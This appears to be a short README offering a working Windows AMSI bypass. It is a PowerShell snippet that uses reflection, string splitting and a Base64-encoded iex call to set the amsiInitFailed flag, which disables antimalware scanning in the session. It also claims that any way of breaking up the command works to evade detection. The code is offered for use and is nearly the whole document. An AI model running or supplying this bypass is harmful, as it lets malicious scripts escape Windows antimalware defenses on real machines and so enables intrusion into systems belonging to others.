# AmsiBypass
List of Windows AMSI bypasses that have not been patched.

# Works as of 8/19/2022 - any way to break up the original command will work since windows sucks
```
$data = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static');
$array = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("JGRhdGEuU2V0VmFsdWUoJG51bGwsJHRydWUp")); iex $array
```
